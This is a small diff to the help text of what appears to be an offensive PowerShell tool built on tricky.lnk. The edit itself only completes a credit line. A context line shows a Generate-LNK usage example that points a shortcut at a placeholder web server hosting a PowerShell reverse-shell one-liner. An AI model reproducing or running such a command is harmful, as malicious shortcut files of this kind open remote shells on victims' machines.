@@ -36,7 +36,7 @@ PS C:\> Generate-LNK -reverseadd "http://youripofwebserver/powershellreverseonel
 https://raw.githubusercontent.com/xillwillx/tricky.lnk/master/tricky.ps1
 
 .NOTES
-This script is a modified version of xillwillx's script and I take no credit of the code. Full credit goes to 
+This script is a modified version of xillwillx's script and I take no credit of the code. Full credit goes to xillwillx.
 Follow him on twitter - @xillwillx
 
 #>
